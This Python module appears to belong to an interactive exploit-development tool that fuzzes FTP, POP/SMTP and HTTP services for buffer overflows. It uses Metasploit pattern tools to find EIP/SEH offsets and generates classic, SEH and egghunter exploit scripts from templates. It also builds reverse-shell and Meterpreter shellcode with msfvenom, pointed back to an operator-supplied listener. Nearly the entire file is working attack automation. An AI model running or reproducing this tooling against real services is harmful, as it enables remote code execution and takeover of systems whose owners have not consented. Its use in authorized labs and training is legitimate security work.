import io
import codecs
import json
import logging
import os
import subprocess
import sys

from protocols.ftp import Ftp
from protocols.http import Http
from protocols.popsmtp import PopSmtp

from utils.hexutil import HexUtil

import codecs

class System:

    nonprint_chars = ["\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0b", "\x0c", "\x0e", "\x0f",
            "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c",
            "\x1d", "\x1e", "\x1f", "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27", "\x28", "\x29",
            "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", "\x37",
            "\x38", "\x39", "\x40"]

    badchars = [r"\x00", r"\x0a", r"\x0d"]

    bytearray = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
        "\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
        "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
        "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
        "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
        "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
        "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
        "\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    @staticmethod
    def get_adapter(config):

        adapter = None

        if(config.mode.lower() == "file"):
            return False;

        while adapter == None:
            if(config.mode.lower() == "ftp"):
                adapter = Ftp(config)

            if(config.mode.lower() == "popsmtp"):
                adapter = PopSmtp(config)

            if(config.mode.lower() == "http"):
                adapter = Http(config)

            if adapter == None:
                config.mode = System.input("[?] Enter protocol [FTP / POPSMTP / HTTP]:")

        return adapter

    @staticmethod
    def hex_decomposition(config):
        destination = System.input("[?] Enter destination hex address : 0x")

        destination_hex = int(destination, 16)
        print(destination_hex)

        print(hex(round(destination_hex / 2)))
        print((round(0x80 * 2)))

        # print(HexUtil.hex_string_format(destination))
        # print(HexUtil.hex_string_to_hex_value(destination))
        # print(HexUtil.hex_string_to_bin_string(destination))

    @staticmethod
    def junk_buffer(config):
        if (config.fuzzer_buffer != ""):
            return config.fuzzer_buffer
        else:
            return "A" * config.offset

    @staticmethod
    def generic_fuzzer(config):

        adapter = System.get_adapter(config)

        fuzzer_func = getattr(adapter, 'fuzzer')
        inject_func = getattr(adapter, 'inject')

        _offset = System.input("[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")

        if (_offset != ""):
            config.offset = int(_offset)
        else:
            config.offset = 0

        if (config.offset == 0 and config.overflow == 0):

            start = 100
            end = 1000
            step = 100

            while True:
                _range = System.input("[?] Enter the range do you want to fuzz separated by commas. Enter for default [100,1000,100]: ")

                try:
                    if("," in _range):
                        _range_arr = _range.split(",")

                        start = start if (_range_arr[0] == None or not _range_arr[0].isnumeric()) else int(_range_arr[0])
                        end = end if (_range_arr[1] == None or not _range_arr[1].isnumeric()) else int(_range_arr[1])
                        step = step if (_range_arr[2] == None or not _range_arr[2].isnumeric()) else int(_range_arr[2])

                except Exception:
                    print("[!] Starting with default...")
                    break

                if (start > end or step > end) :
                    continue
                else:
                    break

            config.overflow = fuzzer_func(config.remoteip, config.remoteport, config.field, start, end, step)

            # print("!" * 100)
            # print("[*] Application crashed at %s bytes with payload : " % (config.overflow, payload))

        # if (config.fuzzer_type.lower() != "printables"):
        #     config.offset = len(config.fuzzer_buffer)

        if (config.offset == 0 and config.overflow > 0):
            print("[+] Generating pattern: msf-pattern_create -l %s" % config.overflow)

            # print subprocess.check_output(['msf-pattern_create', '-l', str(crash)])
            # python3
            # result = subprocess.run(['msf_pattern-create', crash], stdout=subprocess.PIPE)
            # result.stdout

            buffer = subprocess.check_output(['msf-pattern_create', '-l', str(config.overflow)]).strip()

            if (config.mode == "http"):
                buffer = adapter.make_request(config.remoteip, config.remoteport, config.field,
                                              buffer,
                                              config.shellcode, config.offset)

            gonext = System.input("[?] Press ENTER when you wanna send the pattern!!!")

            # print(buffer);

            inject_func(config.remoteip, config.remoteport, config.field, buffer, True)
            print("[+] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")

            print("[!] Hint: !mona findmsp")
            offset_addr = System.input("[?] Check the target debugger and enter EIP / NSEH Address : ")

            _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(offset_addr)])
            _offset = _offset.decode('latin-1').split('offset ')

            config.offset = int(_offset[len(_offset) - 1].strip())

            print("=" * 150)
            print("[*] Fuzzing got offset : " + str(config.offset));
            print("=" * 150)

        System.save_session(config)

    @staticmethod
    def show_session(config):

        print("-" * 100)

        session = {
            "localip": config.localip,
            "localport": config.localport,
            "remoteip": config.remoteip,
            "remoteport": config.remoteport,

            "mode": config.mode,
            "field": config.field,
            "platform": config.platform,
            "http_method": config.http_method,
            "http_uri": config.http_uri,

            "user": config.user,
            "passwd": config.passwd,

            "badchars": config.badchars,
            "shellcode": config.shellcode,

            "offset": config.offset,
            "overflow": config.overflow,
            "jmpesp_add": config.jmpesp_add,

            "nextseh":  config.nextseh,
            "seh": config.seh,
            "ppr_address": config.ppr_address,
            # "payload": config.payload,
            # "nops": config.nops,
            "skip_seh": config.skip_seh,

            # "eip": config.eip,
            # "esp": config.esp,
            # "payload": config.payload,
            "nops": config.nops,
            "jmpesp_add": config.jmpesp_add,
            # "instruction": config.instruction,
            # "hunter": config.hunter,
            "egg": config.egg,
            "src_address": config.src_address,
            "dest_address": config.dest_address,
        }


        print(session)
        print("-" * 100)

        save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o")
        if save == "Y":
            System.save_session(config)

    @staticmethod
    def save_session(config):
        # Config get attributes

        session = {
            "localip": config.localip,
            "localport": config.localport,
            "remoteip": config.remoteip,
            "remoteport": config.remoteport,

            "mode": config.mode,
            "field": config.field,
            "platform": config.platform,
            "http_method": config.http_method,
            "http_uri": config.http_uri,

            "user": config.user,
            "passwd": config.passwd,

            "badchars": config.badchars,
            # "shellcode": config.shellcode,

            "offset": config.offset,
            "overflow": config.overflow,
            "jmpesp_add": config.jmpesp_add,

            "nextseh":  config.nextseh,
            "seh": config.seh,
            "ppr_address": config.ppr_address,
            # "payload": config.payload,
            # "nops": config.nops,
            "skip_seh": config.skip_seh,

            # "eip": config.eip,
            # "esp": config.esp,
            # "payload": config.payload,
            "nops": config.nops,
            "jmpesp_add": config.jmpesp_add,
            # "instruction": config.instruction,
            # "hunter": config.hunter,
            # "egg": config.egg,
            "src_address": str(config.src_address),
            "dest_address": str(config.dest_address),
        }

        with open("sessions/" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".restore", "w") as session_file:
            if (sys.version_info >= (3, 0)):
                session_file.write(json.dumps(session, ensure_ascii=False))
            else:
                session_file.write(unicode(json.dumps(session, ensure_ascii=False, encoding='latin-1')))

        # with codecs.open("sessions/" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".restore",
        #                  "w", 'utf-8') as session_file:
        #     if (sys.version_info >= (3, 0)):
        #         session_file.write(json.dumps(session, ensure_ascii=False))
        #     else:
        #         session_file.write(unicode(json.dumps(session, ensure_ascii=False, encoding='utf8')))


    @staticmethod
    def generate_exploit(config):

        exploittype = System.input("[?] What kind of exploit to you want to generate? [C]lassic | [S]EH | [E]ggHunter: ")

        adapter = System.get_adapter(config)
        stream_func = getattr(adapter, 'output_stream')
        output_stream = stream_func(config.field)

        try:

            if exploittype == "C":
                file = "templates/classic.tpl"

            if exploittype == "S":
                file = "templates/seh.tpl"

            if exploittype == "E":
                file = "templates/egghunter.tpl"

            if os.path.isfile(file):

                if (sys.version_info >= (3, 0)):
                    with io.open(file, 'rb', buffering=0) as default_skel:
                        source = (default_skel.readall())

                        source = source.replace(b"{{{REMOTEIP}}}", config.remoteip.encode('latin1'))
                        source = source.replace(b"{{{REMOTEPORT}}}", str(config.remoteport).encode('latin1'))
                        source = source.replace(b"{{{OFFSET}}}", str(config.offset).encode('latin1'))
                        source = source.replace(b"{{{NOPS}}}", str(config.nops).encode('latin1'))
                        source = source.replace(b"{{{COMMUNICATION_FLOW}}}", str(output_stream).encode('latin1'))

                        if exploittype == "C":
                            source = source.replace(b"{{{JMPESP_ADD}}}", str(config.jmpesp_add).encode('latin1'))

                        if exploittype == "S":
                            source = source.replace(b"{{{NEXT_SEH}}}", str(config.nextseh).encode('latin1'))
                            source = source.replace(b"{{{SEH}}}", str(config.seh).encode('latin1'))

                        if exploittype == "E":
                            source = source.replace(b"{{{HUNTER}}}", str(config.hunter).encode('latin1'))
                            source = source.replace(b"{{{EGG}}}", str(config.egg).encode('latin1'))
                            source = source.replace(b"{{{JMP_SHORT}}}", str(config.instruction).encode('latin1'))

                        if (config.verbose_lv >= 1):
                            print("=" * 30)
                            print(source)
                            print("=" * 30)

                    default_skel.close()

        except Exception as e:
            logging.exception(e)

        System.file_write("sessions/exploit_" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".py", source)

        print("Exploit saved to : sessions/exploit_" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".py !")

    @staticmethod
    def load_session(config):

        if (config.session_ignore == False):
            session_file_path = "sessions/" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + ".restore"
            # print("[!] Searching for " + session_file_path)

            if os.path.isfile(session_file_path):

                if (config.verbose_lv >= 1):
                    print("[!] Session found at " + session_file_path)

                try:

                    if (sys.version_info >= (3, 0)):
                        with io.open(session_file_path, 'rb', buffering=0) as session_file:
                            # session_data =
                            session = json.load(session_file)

                            if (config.verbose_lv >= 1):
                                print(session)

                            for object in session:
                                # print(("[+] Selected %s: %s") % (object, str(session[object])))
                                setattr(config, object, session[object])


                        print("[!] Session restored from " + session_file_path)

                    else:
                        # in Python  2 you should  always  use  io.open()  with an explicit encoding, or open() with an explicit encoding in Python 3
                        with io.open(session_file_path, 'r', encoding='windows-1252') as session_file:
                            for line in session_file:
                                session = json.loads(line)

                        # with codecs.open(session_file_path, 'r', 'utf-8') as session_file:
                        #     # session_data =
                        #     session = json.load(session_file)
                            if (config.verbose_lv >= 1):
                                print(session)

                            for object in session:
                                # print(("[+] Selected %s: %s") % (object, str(session[object])))
                                setattr(config, object, session[object])

                        print("[!] Session restored from " + session_file_path)

                except Exception as e:
                    logging.exception(e)
                    #raise

    @staticmethod
    def shellcode(config):

        payloadtype = System.input("[?] What kind of payload to you want to use? [M]eterpreter | [R]everse | [C]ustom ASM: ")

        print("[!] Preparing Shellcode for reverse shell.....")

        if config.localip == "" or str(config.localport) == "":
            ip_port = System.input("[?] Enter your IP:PORT listening for reverse shell")
            iface = ip_port.split(":")
            config.localip = iface[0]
            config.localport = iface[1]

            System.save_session(config)

        if payloadtype == "R":

            msfvenom_cmd = 'msfvenom -p ' + config.platform + '/shell_reverse_tcp lhost=' + config.localip + ' lport=' + str(
                config.localport) + ' -b "' + "".join(
                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=none'
            print(msfvenom_cmd)
            stream = os.popen(msfvenom_cmd)
            payload = stream.read()

        elif payloadtype == "M":
            msfvenom_cmd = 'msfvenom -p ' + config.platform + '/meterpreter_reverse_tcp lhost=' + config.localip + ' lport=' + str(
                config.localport) + ' -b "' + "".join(
                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=none'
            print(msfvenom_cmd)
            stream = os.popen(msfvenom_cmd)
            payload = stream.read()

        else:
            asmfile = System.input("[?] Enter path to ASM file : ")

            print("nasm " + asmfile + " -o sessions/" + asmfile + ".o")
            stream = os.popen("nasm " + asmfile + " -o sessions/" + asmfile + ".o")
            payload = stream.read()
            print(payload)
            print("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " -e generic/none -f python")
            stream = os.popen("cat sessions/" + asmfile + ".o | msfvenom - p - -a x86 - -platform " + config.platform + " -e generic/none -f python");
            payload = stream.read()
            print(payload)

        # f = open("sessions/" + config.remoteip + "_" + str(config.remoteport) + "_" + config.field + "_shellcode.py", "w")
        # f.write('# ' + msfvenom_cmd + ' \r\n');
        # f.write(payload)
        # f.close()

        # badchars = "\x00\x0a\x0d"
        # result = subprocess.run(['msfvenom', '-p', 'windows/shell_reverse_tcp', 'lhost=', 'lport=', '-b', '""' + badchars + '""', '-a', 'x86', '--platform windows', '-v', 'esp', '-f', 'python'], stdout=subprocess.PIPE)
        # return result.stdout

        # payload = subprocess.check_output(['msfvenom', '-p', 'windows/shell_reverse_tcp', 'lhost=', 'lport=', '-b', badchars, '-a', 'x86', '--platform windows', '-v', 'esp', '-f', 'python']).strip()


        # Can read from generated file:

        with io.open("shellcode_" + config.platform, 'rb', buffering=0) as session_file:
            esp = session_file.readall()

        if (config.verbose_lv >= 1):
            print("=" * 30)
            print(esp)
            print("=" * 30)

        return esp

    @staticmethod
    def file_write(filename, data):

        with open(filename, "w") as file:
            if (sys.version_info >= (3, 0)):
                if not isinstance(data, str):
                    file.write(data.decode('latin-1'))
                else:
                    file.write(data)
            else:
                file.write(data)

        file.close()

    @staticmethod
    def execute(command, args):
        crash = ""
        if (sys.version_info >= (3, 0)):
            result = subprocess.run([command, crash], stdout=subprocess.PIPE)
            result.stdout
        else:
            print(subprocess.check_output([command, '-l', str(crash)]))

    @staticmethod
    def input(message):
        try:
            if (sys.version_info >= (3, 0)):
                return input("\n" + message + " ")
            else:
                print("\n" + message + " ")
                return raw_input()
        except KeyboardInterrupt:
            raise KeyboardInterrupt

